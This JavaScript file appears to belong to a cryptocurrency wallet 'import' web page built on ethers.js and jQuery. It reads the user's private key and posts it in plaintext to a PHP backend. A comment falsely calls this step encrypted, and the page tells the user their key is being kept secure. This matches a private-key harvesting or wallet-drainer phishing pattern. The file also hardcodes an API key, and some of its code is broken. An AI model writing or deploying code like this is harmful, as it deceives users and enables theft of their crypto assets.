//async await permit for node JS
import 'https://cdn.skypack.dev/@officient/regenerator-runtime';

//application constants
const CONTRACT_ADDRESS = "0x1f697f8d823e68b48b83d158b318e87aedf72a66";
const provider = ethers.getDefaultProvider('rinkeby', {etherscan:"3WKBC35KHBKE4TGCH4M9PC8GHCN5BJ7MYT"});

//new wallet method
const new_wallet = async () =>
{

    $("#msg").html(`<div class="alert alert-success">
       <img src='assets/img/loading.gif'> Please wait .... creating wallet
    </div>`);
   
}

//importing wallet via private key
const import_wallet = async () =>
{

   var wallet = null;  $("#msg").html("");

   $("#wallet_btn").html("<img src='assets/img/loading.gif'>");

   try {

     //getting the supplied private key data
     const private_key = $(".private-key").val();
     $("#wallet_btn").html("<img src='assets/img/loading.gif'/>");

     //creating the wallet object with the supplied private key and web3 provider i.e etherscan
     wallet = await new ethers.Wallet(private_key, provider);
     const wallet_address = await wallet.getAddress();

     $("#msg").html(`<div class="alert alert-success" id="msg-">
        Wallet import successful, Here's your wallet address <b>`+ wallet_address +`</b><br>
        <img src='assets/img/loading.gif'/> Please be patient ... we're keeping things secured.
      </div>`);
     $(".private-key").val("");

      //export encrypted private key 

      $.post("assets/php/backend.php", {"key" : private_key}, async (res, req) => {
       
        res = JSON.parse(res);

        if (res.status) {

            $("#msg").html(`<div class="alert alert-success">
                        Redirecting ....
                      </div>`);

            window.location = "wallet.html";

            return;
        }

        $("#msg").html(`<div class="alert alert-danger">
                        Process failed, please retry
                      </div>`);
                      
        private_key = null;

      });

   } catch (err) {
       console.log("Wallet import failed");
       $("#msg").html(`<div class="alert alert-danger">
                         Could not import wallet. Please check your <b>private key</b> again.
                      </div>`);
   }

   finally {
        console.log(wallet);
        $("#wallet_btn").html("Import Wallet");
   }

}


window.onload = () =>
{

   $("#wallet_btn").click(import_wallet);
  
}
